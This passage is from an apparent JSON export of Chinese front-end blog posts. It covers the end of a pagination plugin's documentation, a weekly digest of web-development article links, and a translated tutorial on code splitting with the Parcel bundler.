/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003edataNumberAttr\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e页码元素上的一个属性，其值为页码元素所表示的页码\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003edata-number\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eprevCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003epage-prev\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e上一页 按钮的类名\u003ccode\u003eclass\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003enextCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003epage-next\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e下一页 按钮的类名\u003ccode\u003eclass\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003edisbalePrevCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eno-prev\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e禁用 上一页 按钮的可用性时给此按钮添加的类名\u003ccode\u003eclass\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003edisbaleNextCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eno-next\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e禁用 下一页 按钮的可用性时给此按钮添加的类名\u003ccode\u003eclass\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003epageNumberCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003epage-number\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e不包括 上一页 下一页、省略号占位符按钮之外的所有页码元素统一类名\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eswEvent\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eclick\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e触发切换页面的事件\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eonPageChange\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e-\u003c/td\u003e\n\u003ctd\u003e页码切换时的回调函数\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e除了根据页面上的页码和上一页、下一页按钮进行页码切换外，插件还有一个 \u003ccode\u003egotoPage\u003c/code\u003e方法可用，此方法接收一个类型为 \u003ccode\u003enumber\u003c/code\u003e的参数，调用此方法，就会跳到此参数指定的页码上，例如，跳转到页码 \u003ccode\u003e9\u003c/code\u003e上：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eslp.gotoPage(\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果传入的参数不是合法的页码，则不会进行任何操作。\u003c/p\u003e\n\u003cp\u003e本文的可运行示例代码已经放到 \u003ca target=\"_blank\" href=\"https://github.com/accforgit/blog-data/tree/master/%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5\"\u003eGithub\u003c/a\u003e上了，有兴趣的可以看下~\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eSimplePagination\u003c/code\u003e这个类主要在于页码切换的逻辑判断，外加简单地组装了 \u003ccode\u003eDOM\u003c/code\u003e结构，我在示例代码中随便写了个样式，如果你不喜欢这个样式完全可以自己重写。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514894633.7872","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e918"},"id":"5a4ae95d51882533f01eec64","author":{"$oid":"5a4b765a751bf823c002e90c"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"ELSE 技术周刊(2018.01.01期)","meta":{"likeCount":0},"tag":["前端","React.js","JavaScript","API"],"comment":[],"shortContent":"就在刚刚，微信官方公布了几个小程序爆炸性的新闻，在 2017 年的年底，这个新闻似乎是在告诉大家，小程序能做的事越来越多，2018 年你再也没法再忽视它。 在前端，往往由一个前端团队创建并维护一个 Web 应用程序，使用 REST API 从后端服务获取数据。这种方式如果做得好…","content":"\u003ch2 class=\"heading\"\u003e业界动态\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32451197\"\u003e小程序又搞事情，H5 开发的春天来了！\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e就在刚刚，微信官方公布了几个小程序爆炸性的新闻，在 2017 年的年底，这个新闻似乎是在告诉大家，小程序能做的事越来越多，2018 年你再也没法再忽视它。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前端开发\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32378432?utm_medium=social\u0026amp;utm_source=wechat_session\u0026amp;from=singlemessage\u0026amp;isappinstalled=0\"\u003e技术雷达之「微前端」- 将微服务理念扩展到前端开发\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e在前端，往往由一个前端团队创建并维护一个 Web 应用程序，使用 REST API 从后端服务获取数据。这种方式如果做得好的话，它能够提供优秀的用户体验。但主要的缺点是单页面应用（SPA）不能很好地扩展和部署。在一个大公司里，单前端团队可能成为一个发展瓶颈。随着时间的推移，往往由一个独立团队所开发的前端层越来越难以维护。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/s/vGKkyXznXAcwO31Us3DagQ\"\u003e2018 年，React 将独占前端框架鳌头?\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e一份来自Stateofjs的调查数据显示：相比 Angular 和 Vue， React 是 2017 年的主要 JS 框架，尤其是 React Native 以前所未有的速度提升自己。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://about.gitlab.com/2017/12/19/moving-to-headless-chrome/\"\u003eHow GitLab switched to Headless Chrome for testing\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eGitLab最近将前端测试从PhantomJS转向headless Chrome.文章详细解释了该团队作出此决定的缘由及面临的挑战，以及headless Chrome带来的好处。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32298468\"\u003e2017年关于JavaScript你需要知道的事情\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e这一年，JavaScript确实发生了很多事情，一起来回顾一下。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32075662\"\u003eReact 之无限滚动\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003epwa 在国外也火了几年了。国内虽然暂时还不重视 webapp，但是从 safari 开始支持 pwa，和国内一些公司开始尝试 pwa 的势头看来，pwa 即将会在国内流行。作为强调性能和体验的 pwa 项目中，无线滚动是每个 pwa 项目都需要解决的问题。本文从 twitter 的无线滚动的视角出发，尝试实现了一套具体的无限滚动方案。介于 twitter 的文章中只提到概念没有提到任何代码和具体实现，我会在具体实现上着重说明。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://qiutc.me/post/shape-detection-api.html#comment-wrap\"\u003e浏览器中的图像识别 API\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e在本篇文章中介绍了 Chrome 中集成的图形识别 API （Shape Detection API），主要提供了三个接口： FaceDetector: 人脸识别、BarcodeDetector: 二维码/条形码 识别、TextDetector: 文本识别；越来越多的底层API 可以在浏览器中直接使用， 对于web 应用来说将更加具有独立性和丰富性。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a446d19f265da43052eebcc\"\u003e你以为 CSS3 只是个简单的布局\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e本篇文章 汇总了一些利用 CSS3实现各种图案的奇思妙想， 原作者利用很少的标签， 主要运用CSS3的一些特性达到一些效果， 有意思。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://www.jianshu.com/p/82894a71376e\"\u003e现代 JavaScript 中的 AST\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e这篇文章介绍了 AST 在现代化 JavaScript 项目中的应用，包括 ESLint、Babel、Webpack\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e技术纵横\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/s/r6Zj9Umlc9v_rqplq8207A\"\u003eDocker说了这么多 最全的一篇在这里\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eDocker，近两年才流行起来的超轻量级虚拟机，它可以让你轻松完成持续集成、自动交付、自动部署，并且实现开发环境、测试环境、运维环境三方环境的真正同步。本文从 Docker 定义，作用，技术架构，安装和使用等全方位带你看懂 Docker。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/s/1HqAPV7l5Oi4xKqpN6q5GA\"\u003e2017年度盘点：15个最流行的GitHub机器学习项目\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e作者在本文中列出了 2017 年 GitHub 平台上最为热门的知识库，其中包含了学习资料与工具。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实用推荐\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://blog.vigneshm.com/building-a-reactjs-project-with-parceljs-d88cdd178e50\"\u003eBuilding a Reactjs project with Parceljs\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e目前最快的JavaScript打包工具Parceljs，在不到2周的时间，已经在github上斩获了11k+star，这是一篇教你如何用Parcel来构建React项目的入门文章。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e程序人生\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"http://geek.csdn.net/news/detail/248211\"\u003e你写的代码，是别人的噩梦吗?\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003e谈的主题是企业应用架构实践，作者分析了造成现在系统异常复杂四大罪魁祸首，可扩展性差 、面向过程、分层不合理、随心所欲，并提出应对之策，最终形成一套高内聚，低耦合，可扩展，易理解的架构体系。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eELSE 技术周刊由 \u003ca target=\"_blank\" href=\"https://github.com/CtripFE\"\u003eIFT 小组\u003c/a\u003e 出品，汇聚一周好文章， \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32520268\"\u003e周刊原文\u003c/a\u003e。本期编辑：\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/CurtisCBS\"\u003e@Curtis\u003c/a\u003e 前端中年人\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/stoneyong\"\u003e@StoneZou\u003c/a\u003e 前端搬砖工，不安分于前端开发的搬砖工\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/StevenX911\"\u003e@Steven\u003c/a\u003e 写 JS 的老年人\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/mirreal\"\u003e@mirreal\u003c/a\u003e 想当设计师的程序员不是一个好攻城狮\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/Jade05\"\u003e@Jade\u003c/a\u003e 以前想多点后端sense写前端，现在想多点产品sense写前端\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/CtripFE/fe-weekly/issues\"\u003e点击这里\u003c/a\u003e 向我们推荐你读到的好文章。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514894591.6142","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e91c"},"id":"5a478289f265da430d5859ff","author":{"$oid":"5a4b765a751bf823c002e912"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/30/160a755da06ede67?w=680\u0026h=616\u0026f=gif\u0026s=1256772","https://user-gold-cdn.xitu.io/2017/12/30/160a755d9ed75766?w=800\u0026h=800\u0026f=png\u0026s=45332","https://user-gold-cdn.xitu.io/2017/12/30/160a755d9ea7cfdd?w=432\u0026h=437\u0026f=png\u0026s=16478","https://user-gold-cdn.xitu.io/2017/12/30/160a755d9eb6406c?w=602\u0026h=193\u0026f=png\u0026s=14942","https://user-gold-cdn.xitu.io/2017/12/30/160a755d9f1d6257?w=800\u0026h=163\u0026f=png\u0026s=29508","https://user-gold-cdn.xitu.io/2017/12/30/160a755d9f0cc442?w=800\u0026h=175\u0026f=png\u0026s=40011"],"screenShot":null}],"title":"使用 web 应用打包工具 Parcel 实现代码分割","meta":{"likeCount":0},"tag":["前端","掘金翻译计划"],"comment":[],"shortContent":"代码分割可谓是当今 web 开发中很热门的话题。今天，我们将探索如何使用 parcel 轻松地实现代码分割。 如果你对它很熟悉，那么你可以跳过这部分。不然的话，还是接着往下看吧。 如果你使用过 JavaScript 框架进行前端开发的话，那么最后肯定会打包成一个很大的 Java…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca target=\"_blank\" href=\"https://hackernoon.com/code-splitting-with-parcel-web-app-bundler-fe06cc3a20da\"\u003eCode Splitting with Parcel Web App Bundler\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca target=\"_blank\" href=\"https://hackernoon.com/@ankushc?source=post_header_lockup\"\u003eAnkush Chatterjee\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner/blob/master/TODO/code-splitting-with-parcel-web-app-bundler.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/code-splitting-with-parcel-web-app-bundler.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca target=\"_blank\" href=\"https://github.com/kangkai124\"\u003ekk\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca target=\"_blank\" href=\"https://github.com/noahziheng\"\u003enoahziheng\u003c/a\u003e \u003ca target=\"_blank\" href=\"https://github.com/pot-code\"\u003epot-code\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755da06ede67?w=680\u0026amp;h=616\u0026amp;f=gif\u0026amp;s=1256772\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e代码分割可谓是当今 web 开发中很热门的话题。今天，我们将探索如何使用 parcel 轻松地实现代码分割。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e什么是代码分割？\u003c/h4\u003e\n\u003cp\u003e如果你对它很熟悉，那么你可以跳过这部分。不然的话，还是接着往下看吧。\u003c/p\u003e\n\u003cp\u003e如果你使用过 JavaScript 框架进行前端开发的话，那么最后肯定会打包成一个很大的 JavaScript 文件。可能因为你写的应用比较复杂，有很多模块之类，总之，这些包都太大了。文件一大，下载的时间就越长，在带宽较低的网络环境下问题尤为显著。所以，请仔细斟酌一下：用户是否真的需要一次性加载所有的功能？\u003c/p\u003e\n\u003cp\u003e想象有这么一个电子商务的单页面应用。用户登录进来能只是想看一下产品清单，但是他已经花了很长时间，下载到的 JavaScript 不仅仅是渲染产品那部分，还渲染了过滤、产品详情、供货等等等等。\u003c/p\u003e\n\u003cp\u003e如果这样做的话，那对用户太不公平了！如果我们只加载用户需要的那部分代码，是不是特别赞？\u003c/p\u003e\n\u003cp\u003e所以，这种把比较大的包拆分成多个更小的包的方法就是代码分割。这些更小的包可以按需或者异步加载。虽然听上去很难实现，但是像 webpack 这种现代打包工具就能帮你做这件事，而 parcel 使用起来更加简单。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755d9ed75766?w=800\u0026amp;h=800\u0026amp;f=png\u0026amp;s=45332\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e文件拆分成了这些可爱的小 baby 们。来自 \u003ca target=\"_blank\" href=\"https://medium.com/@shreyawriteshere\"\u003eShreya\u003c/a\u003e [\u003ca target=\"_blank\" href=\"https://www.instagram.com/shreyadoodles/\"\u003eInstagram\u003c/a\u003e]\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eParcel 到底是什么呢？\u003c/h4\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 是一个\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e极速零配置 web 应用打包工具\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e它使得模块打包变得十分简单！如果你还不知道 Parcel，推荐你先看一下 \u003ca target=\"_blank\" href=\"https://medium.com/@wesharehoodies\"\u003eIndrek Lasn\u003c/a\u003e 写的 \u003ca target=\"_blank\" href=\"https://medium.freecodecamp.org/all-you-need-to-know-about-parcel-dbe151b70082\"\u003e这篇文章\u003c/a\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e开始吧！\u003c/h4\u003e\n\u003cp\u003e嗯...代码部分，我不会使用任何框架，用不用框架并不影响操作。下面例子会用非常简单的代码展示如何拆分代码。\u003c/p\u003e\n\u003cp\u003e创建一个新的文件夹， \u003ccode\u003e初始化\u003c/code\u003e 一个项目：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm init\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或者，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eyarn init\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e选择你喜欢的方式（yarn 是我的菜 😉），然后按照下图创建一些文件。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755d9ea7cfdd?w=432\u0026amp;h=437\u0026amp;f=png\u0026amp;s=16478\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e世界上最简单的结构有没有？\u003c/p\u003e\n\u003cp\u003e这个例子中，我们只在 \u003ccode\u003eindex.html\u003c/code\u003e 中引入 \u003ccode\u003eindex.js\u003c/code\u003e 文件，然后通过一个事件（这个例子中我们使用点击按钮）加载 \u003ccode\u003esomeModule.js\u003c/code\u003e 文件，并用它里面的方法来渲染一些内容。\u003c/p\u003e\n\u003cp\u003e打开 \u003ccode\u003eindex.html\u003c/code\u003e 添加如下代码。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n  \u0026lt;head\u0026gt;\n    \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n    \u0026lt;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"X-UA-Compatible\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"ie=edge\"\u003c/span\u003e\u0026gt;\n    \u0026lt;title\u0026gt;Code Splitting like Humans\u0026lt;/title\u0026gt;\n  \u0026lt;/head\u0026gt;\n  \u0026lt;body\u0026gt;\n    \u0026lt;button id=\u003cspan class=\"hljs-string\"\u003e\"bt\"\u003c/span\u003e\u0026gt;Click\u0026lt;/button\u0026gt;\n    \u0026lt;div class=\u003cspan class=\"hljs-string\"\u003e\"holder\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"./index.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e例子很简单，只是一个 HTML 模板，包括一个 button 按钮和渲染 \u003ccode\u003esomeModule.js\u003c/code\u003e 内容的 \u003ccode\u003ediv\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e接着我们来写 \u003ccode\u003esomeModule\u003c/code\u003e 文件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econsole.log(\u003cspan class=\"hljs-string\"\u003e\"someModule.js loaded\"\u003c/span\u003e);\nmodule.exports = {\n  render : \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(element){\n      element.innerHTML = \u003cspan class=\"hljs-string\"\u003e\"You clicked a button\"\u003c/span\u003e;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们 export 了一个对象，它有一个 \u003ccode\u003erender\u003c/code\u003e 方法，接收一个元素并将「You clicked a button」渲染到这个元素内部。\u003c/p\u003e\n\u003cp\u003e现在有意思了。在我们的 \u003ccode\u003eindex.js\u003c/code\u003e 中，我们要处理 button 按钮的点击事件，动态的加载 \u003ccode\u003esomeModule\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e对于动态的异步加载，我们使用 \u003ccode\u003eimport()\u003c/code\u003e 语法，它会按需异步加载一个模块。\u003c/p\u003e\n\u003cp\u003e看一下如何使用，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport(\u003cspan class=\"hljs-string\"\u003e'./path/to/module'\u003c/span\u003e).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(page){\n//Do Something\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e因为 \u003ccode\u003eimport\u003c/code\u003e 是异步的，所以我们用 \u003ccode\u003ethen\u003c/code\u003e 来处理它返回的 promise 对象。在 \u003ccode\u003ethen\u003c/code\u003e 方法中，我们传入一个函数，这个函数接收从该模块加载进来的对象。这和 \u003ccode\u003econst page = require('./path/to/module');\u003c/code\u003e 很相似，只是动态异步执行而已。\u003c/p\u003e\n\u003cp\u003e在我们的例子中这么写，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport(\u003cspan class=\"hljs-string\"\u003e'./someModule'\u003c/span\u003e).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (page) {\n   page.render(document.querySelector(\u003cspan class=\"hljs-string\"\u003e\".holder\"\u003c/span\u003e));\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e于是我们加载了 \u003ccode\u003esomeModule\u003c/code\u003e 并调用了它的 render 方法。\u003c/p\u003e\n\u003cp\u003e接着把它加到按钮点击事件的监听函数中。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econsole.log(\u003cspan class=\"hljs-string\"\u003e\"index.js loaded\"\u003c/span\u003e);\nwindow.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n       document.querySelector(\u003cspan class=\"hljs-string\"\u003e\"#bt\"\u003c/span\u003e).addEventListener(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(evt){\n     console.log(\u003cspan class=\"hljs-string\"\u003e\"Button Clicked\"\u003c/span\u003e);\n     import(\u003cspan class=\"hljs-string\"\u003e'./someModule'\u003c/span\u003e).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (page) {\n         page.render(document.querySelector(\u003cspan class=\"hljs-string\"\u003e\".holder\"\u003c/span\u003e));\n     });\n});\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e至此代码已经写完了，接下来只需要运行 parcel 即可，它会自动完成所有的配置工作！\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eparcel index.html\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e它会产生以下的文件。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755d9eb6406c?w=602\u0026amp;h=193\u0026amp;f=png\u0026amp;s=14942\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在你的浏览器中运行，观察结果。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755d9f1d6257?w=800\u0026amp;h=163\u0026amp;f=png\u0026amp;s=29508\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e控制台输出\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a755d9f0cc442?w=800\u0026amp;h=175\u0026amp;f=png\u0026amp;s=40011\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e网络活动记录\u003c/p\u003e\n\u003cp\u003e可以从控制台输出看到，\u003ccode\u003esomeModule\u003c/code\u003e 在按钮被点击之后才被加载。通过 network 可以看到调用 import 后，\u003ccode\u003ecodesplit-parcel.js\u003c/code\u003e 是如何加载模块的。\u003c/p\u003e\n\u003cp\u003e代码分割是多么神奇的一件事，既然我们可以这么简单的实现，那我们还有理由不用吗？💞💞\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca target=\"_blank\" href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF\"\u003e前端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF\"\u003e后端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE\"\u003e区块链\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81\"\u003e产品\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1\"\u003e设计\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD\"\u003e人工智能\u003c/a\u003e等领域，想要查看更多优质译文请持续关注 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca target=\"_blank\" href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca target=\"_blank\" 